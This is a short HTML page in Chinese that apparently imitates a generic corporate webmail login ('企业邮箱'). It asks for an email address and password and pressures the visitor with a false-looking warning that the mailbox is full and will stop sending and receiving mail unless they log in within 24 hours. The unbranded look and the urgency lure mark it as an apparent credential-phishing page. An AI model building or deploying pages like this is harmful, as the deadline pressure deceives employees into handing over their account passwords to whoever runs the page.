<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><title>企业邮箱 - 用户登录</title>
<style>body{margin:0;font-family:"Microsoft YaHei",Arial,sans-serif;background:#f5f7fa;color:#333}
header{background:#34495e;color:#fff;padding:14px 40px;display:flex;align-items:center;gap:24px}
.logo{font-size:24px;font-weight:700;letter-spacing:2px}
.card{margin:40px auto;width:400px;background:#fff;border-radius:8px;padding:32px;box-shadow:0 2px 10px #0001}
.card h2{margin:0 0 6px;font-size:20px;color:#34495e}.card p{margin:0 0 16px;font-size:13px;color:#999}
label{display:block;font-size:13px;color:#555;margin:12px 0 6px}
input{width:100%;height:40px;border:1px solid #ccd;border-radius:6px;padding:0 10px;font-size:14px;box-sizing:border-box}
button{width:100%;height:42px;margin-top:18px;background:#34495e;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer}
.tip{margin:14px 0 0;font-size:12px;color:#c00}
footer{padding:20px;text-align:center;color:#999;font-size:12px}</style></head>
<body><header><span class="logo">企业邮箱</span><span>安全登录入口</span></header>
<div class="card"><h2>用户登录</h2><p>邮箱容量将满，请登录清理</p>
<form action="/mail/login" method="post">
<label>邮箱账号</label><input placeholder="name@company.com">
<label>密码</label><input type="password" placeholder="请输入密码">
<button type="submit">登录邮箱</button></form>
<p class="tip">系统提示：您的邮箱已满，请在 24 小时内登录清理，否则将停止收发邮件。</p></div>
<footer>© 企业邮件系统</footer></body></html>
